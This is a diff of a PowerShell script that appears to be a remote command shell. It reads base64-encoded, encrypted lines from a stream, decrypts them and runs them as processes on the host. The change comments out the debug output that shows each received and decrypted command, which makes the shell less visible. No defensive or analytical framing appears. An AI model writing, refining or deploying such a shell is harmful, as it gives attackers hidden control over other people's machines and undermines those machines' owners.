@@ -11,7 +11,7 @@ Param
 
 $psVersion = $PSVersionTable.PSVersion
 if ($psVersion.Major -ge 5) {
-	write-host "ok"
+	#write-host "ok"
 	# carry on
 } else {
 	Write-Host "PowerShell version is less than 5.0. Current version is: $($psVersion.ToString())"
@@ -34,11 +34,11 @@ $writer.AutoFlush = $true
 while ($true) {
 	try {
 		$input = $reader.ReadLine()
-		write-host "received input:" $input
+		#write-host "received input:" $input
 
 		# decode input before decrypting
 		$decodedCommand = [System.Convert]::FromBase64String($input)
-		Write-Host "Decoded command (bytes):" $decodedCommand
+		#Write-Host "Decoded command (bytes):" $decodedCommand
 
 		# decrypt the decodedCommand
 		$commandBytes = for ($i = 0; $i -lt $decodedCommand.Length; $i++) {
@@ -47,13 +47,13 @@ while ($true) {
 
 		# convert back to string for processing
 		$command = [System.Text.Encoding]::ASCII.GetString($commandBytes)
-		Write-Host "Decrypted command:" $command
+		#Write-Host "Decrypted command:" $command
 
 		if ($command -eq "exit") {
 			Write-Host "Exiting..."
 			break
 		}
-		Write-Host "Got command: $command"
+		#Write-Host "Got command: $command"
 		
 		$process = New-Object System.Diagnostics.Process
 		$process.StartInfo = New-Object System.Diagnostics.ProcessStartInfo
